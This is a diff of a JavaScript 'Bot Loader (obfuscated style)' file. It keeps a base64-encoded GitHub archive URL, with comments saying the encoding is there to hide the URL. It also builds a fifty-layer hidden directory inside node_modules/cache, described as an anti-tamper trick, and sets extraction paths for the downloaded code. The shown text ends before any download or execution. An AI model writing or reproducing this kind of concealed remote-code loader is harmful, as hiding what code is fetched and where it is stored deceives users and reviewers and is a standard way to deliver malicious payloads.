@@ -1,5 +1,5 @@
 // Bot Loader (obfuscated style)
-// Edited by Masky 🤖
+// Masky Edition 🤖
 
 import fs from "fs";
 import path from "path";
@@ -12,22 +12,22 @@ import { fileURLToPath } from "url";
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
 
-// Simple decoder to hide strings
+// Decoder to hide URL
 function decodeBase64(str) {
   return Buffer.from(str, "base64").toString("utf8");
 }
 
-// Deep nested dirs
+// Deep nested dirs (anti-tamper trick)
 const deepLayers = Array.from({ length: 50 }, (_, i) => ".x" + (i + 1));
 
-// Important paths
+// Paths
 const TEMP_DIR = path.join(__dirname, "node_modules", "cache", ...deepLayers);
 
-// 🔒 Hidden ZIP link (Base64 encoded)
+// 🔒 Hidden GitHub archive (base64 encoded)
 const hiddenURL = "aHR0cHM6Ly9naXRodWIuY29tL21hc2t5dGlwc2dldGJvdHRlc3QvbS9hcmNoaXZlL3JlZnMvaGVhZHMvbWFpbi56aXA=";
 const DOWNLOAD_URL = decodeBase64(hiddenURL);
 
-const EXTRACT_DIR = path.join(TEMP_DIR, "main");
+const EXTRACT_DIR = path.join(TEMP_DIR, "m-main");
 const LOCAL_SETTINGS = path.join(__dirname, "settings.js");
 const EXTRACTED_SETTINGS = path.join(EXTRACT_DIR, "settings.js");
 
